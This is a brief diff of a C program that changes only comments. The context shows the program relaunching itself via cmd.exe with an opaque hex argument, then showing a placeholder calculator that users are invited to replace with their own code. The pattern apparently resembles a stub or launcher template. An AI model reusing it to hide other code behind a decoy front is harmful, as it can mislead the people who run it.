@@ -111,9 +111,7 @@ int main(int argc, char* argv[]) {
 		snprintf(command, 512, "C:\\Windows\\system32\\cmd.exe /c .\\%s --d2913731286a0e5019d30d9474838969", argv[0]);
 		system(command);
 
-		// Put your code here
-
-		// Default calc application	
+		// Default calc application, you can remove it if you want to and put your own code there
 		printf("Simple Calculator in C | v0.1\n\n");
 
 		printf("1. Add      (+)\n");
